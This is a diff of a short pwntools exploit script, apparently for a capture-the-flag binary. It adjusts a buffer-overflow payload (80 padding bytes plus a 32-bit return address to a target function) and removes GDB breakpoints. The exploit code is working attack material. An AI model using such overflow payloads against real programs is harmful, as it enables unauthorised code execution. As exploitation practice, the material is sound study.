@@ -23,11 +23,7 @@ def start(argv=[], *a, **kw):
 
 # Specify your GDB script here for debugging
 # GDB will be launched if the exploit is run via e.g.
-# ./exploit.py GDB
 gdbscript = '''
-b *main
-b *0x1229
-continue
 '''.format(**locals())
 
 #===========================================================
@@ -35,13 +31,12 @@ continue
 #===========================================================
 
 #function address
-call_first = p64(0x1209)
+call_first = p32(0x80491c6)
 
-buff_overflow = b"A"*72
+buff_overflow = b"A"*80
 
 payload = [buff_overflow, call_first]
 
 io = start([b"".join(payload)])
 
 io.interactive()
-
